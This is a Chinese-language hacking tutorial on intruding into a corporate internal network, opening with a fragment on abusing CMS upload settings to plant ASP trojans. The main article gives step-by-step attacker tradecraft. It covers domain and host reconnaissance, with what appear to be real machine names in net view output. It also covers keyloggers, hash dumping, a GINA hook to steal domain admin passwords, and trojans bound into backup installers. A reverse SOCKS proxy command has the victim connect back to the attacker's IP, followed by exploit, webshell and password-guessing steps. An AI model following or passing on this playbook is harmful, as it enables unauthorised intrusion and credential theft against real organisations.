例如bbsxp后台中允许添加asa|asP类型，通过添加操作后，就可以上传这两类文件了；ewebeditor后台也能添加asa类型，添加完毕即可直接上传asa后缀的木马；而LeadBbs3.14后台也允许在上传类型中增加asp类型，不过添加时asp后面必须有个空格，然后在前台即可上传ASP木马（在木马文件扩展名.asp后面也要加个空格）。
 
【防范方法】：删除后台管理中的添加上传类型功能。


========================================================================================================================================================================================================================================================                                                       渗透之内网讲解



内网，很多人应该形成了这个概念，很多大型网络的外部网站或是服务器不一定有用，当然外网也是一个突破口。很多时候我们直接从外网入手，随着安 全的不断加固，已变得越来越困难。那么黑客通常是怎么进行内网渗透的，内网渗透又是怎样与社会工程学联系起来呢，今天主要描述黑客内网渗透的常用操作手 法，关于如何获得内网机器，请查找我以前的一篇文章《内网渗透---如何打开突破口》。

渗透的过程就是一个信息刺探、利用、思考、突破的过程。首先在我们获得一台内网的机器后应该怎么做，当然是信息刺探。

 一．信息刺探
 1． 当 前机器的人物身份，当前控制的这台机器人物是一个什么样的身份，客服、销售人员还是开发人员，还是管理员。客服会做些什么，会通过什么方式跟其它人联系； 开发人员在开发什么，应该会跟管理员联系，也会有一定的外网管理权限和内网测试服务器，这种情况下内网测试服务器是可以搞定的。如果是客服机器或是销售人 员机器呢，他一定有整个公司或是网络的联系方式，自己发挥想象去。是管理员机器的话就不用说。
 2． 当前网络结构的分析，是域结构，还是划分vlan的结构，大多数大型网络是域结构。一般外网的服务器都是有硬件防火墙的，并且指定内网的某些机器的mac才可以连接。所以我们先看看内网情况：
 C:\WINNT\system32>net view
 伺服器名稱 說明

-------------------------------------------------------------------------------
 \\2007ACC
 \\ABS-XP
 \\ACER-TS250 NAS 4BAY SATA
 \\ACER-TS500 NAS 4BAY SATA
 \\ACER6100
 \\AKIRA-WU akira-wu
 \\ALICECHEN
 \\AMYCHIU
 \\ANDY2007
 \\ANDYTEST01
 \\ANNHUANG
 \\ANNIEKUO
 \\APOLLO
 \\APOPO
 \\ARTSERVER
 \\AUGTCHIEN
 \\AVSERVER
 \\BENLEE01
 \\BENSON-NB
 …
 先用net view查看内网的情况,列出的机器就是在网络结构中有联系的机器，但不一定都在一个网段，所以ping出这些机器的ip，以便分析大概有哪些网段.
 3.了解本机在网络中所占的角色
 先ipconfig /all看下是否在域中，如图：


我们可以得知，存在一个域xxxx，从内网ip来看，应该还存在很多个段，内网很大。我们ping 一下域xxxx，得到域服务器的ip.
 我们再来看一下本机在域里面的角色,如图:

 看来只是一个普通域用户.我们再来查看一下域里面的用户.如图：


…
 域里面的用户很多，那么我们再查看一下域管理员有哪些：


 从上面我们掌握了内网的大概信息。下面我们进一步利用这些信息。
 二.信息的利用：
 1． 首 先是内网占据的这台机器，要做几个必要的措施：1）种键盘记录，记录其可能登录的密码，有用的。2)抓hash跑密码，主要查看密码规则是否有规律，它的 密码也可以去试下其它机器的密码，看是否通用。3）种gina，这一步主要不是记录当前用户的密码，而是为了来记录域管理员的登录密码，因为域管理员是有 权限登录下面每台用户的机器的，gina是可以记到的，记到域管理密码后，内网在域中的机器就可以全部控制了。4）给占据机器上的备用安装文件或是备用驱 动上绑马，此是为了防止对方重装机器，马就掉了。
 2． 反弹socks代理。
 在内网渗透中，反弹socks代理是很必要的，大家都知道用lcx来转发端口，好像很少看到有人是直接反弹代理来连接。因为我们要连接内网的其 它机器，我们不可能一个一个的去中转端口连接，在当前控制的机器上开代理也没办法，因为对方在内网。所以我们就用反弹代理的方式。这种方式其实大家都明 白。

首先在本机监听：
 c:\>hd -s -listen 53 1180
 [+] Listening ConnectBack Port 53 ......
 [+] Listen OK!
 [+] Listening Socks5 Agent Port 1180 ......
 [+] Listen2 OK!
 [+] Waiting for MainSocket on port:53 ......
 此命令是将连接进来的53端口的数据包连接到1180端口。

在对方机器上运行:

C:\RECYCLER>hd -s -connect x.x.x.x 53
 [+] MainSocket Connect to x.x.x.x:53 Success!
 [+] Send Main Command ok!
 [+] Recv Main Command ok!
 [+] Send Main Command again ok!
 上面的x.x.x.x为你的外网ip，下面为你接收到反弹回来的代理显示的情况。
 c:\>hd -s -listen 53 1180
 [+] Listening ConnectBack Port 53 ......
 [+] Listen OK!
 [+] Listening Socks5 Agent Port 1180 ......
 [+] Listen2 OK!
 [+] Waiting for MainSocket on port:53 ......
 [+] Recv Main Command Echo ok!
 [+] Send Main Command Echo ok!
 [+] Recv Main Command Echo again ok!
 [+] Get a MainSocket on port 53 from x.x.x.x ......
 [+] Waiting Client on Socks5 Agent Port:1180....

上面ok了，接下来在你本机安装sockscap，照下图设置就ok了。



 Sockscap设置在控制台的”文件”-“设置”里，控制台可以将你需要代理的程序放在上面，直接拖进去即可，控制台机的程序就可以进接连接 内网的机器了。如直接用mstsc连接内网其它机器的3389,就可以上去试密码或是登录管理，也可以用mssql连接内网的1433，尝试sa弱口令 等。总之反弹socks是你利用已控制的内网机器通向内网其它机器的一道桥梁。

三．思考：
 信息有了，通道有了，接下来我们怎么做？
 1． 内网溢出,通过对内网的扫描情况，判断win2000的机器，利用ms06040进行运程溢出。
 2． 内网web，通过内网的扫描，用sockscap上的ie来打开内网开放的web，在内网采用web注入或上传的方式来获取webshell提权。
 3． 内网弱口令试探，利用ipc,或是3389，和已掌握的密码信息来尝试猜解内网nt的密码，当然这需要耐心，也是非常有用的。

4． 猜解sql弱口令，在sockscap控制台中用sql连接器连接内网开放1433或是3306的机器，猜解弱口令。
 5． 内网嗅探，不得已的办法，不推荐。
 6． 内网主动会话劫持，篇幅长，难度高，下次详写。
 四．突破：
 突破是考验经验和思维的时候，利用已掌握的信息去突破面临的困难。如，如何拿到第一台内网服务器站稳脚；如何拿到内网到外网授权的机器；如何拿到外网密码。
 在内网中站稳脚后，迅速判断管理员机器，控制管理员的机器极为重要。一般从机器名可以看出管理员机器，管理员的机器名常为：andy 、admin 、peter、 kater，在域控的环境中，我们只要得到域控密码就可以直接用ipc连接管理员机器种马。不是域控的环境中，我们也可以在内网测试服务器中跑出服务器的 密码进而拿去尝试管理员的密码。
 在突破过程中，内网的数据库和web的分析很重要，数据库里面有很多有用的信息，web的数据库连接及作用也有助于进一步的分析。总之在这一过程中只有灵活运用，发散思维才可以进一步的突破和控制。

黑客与安全是一个矛盾话题，只有知已知彼才能更好地维护内网安全。以上是黑客常用的内网渗透手法，知识有限，文笔粗拙，高手笑过，此文仅供新手科普。























































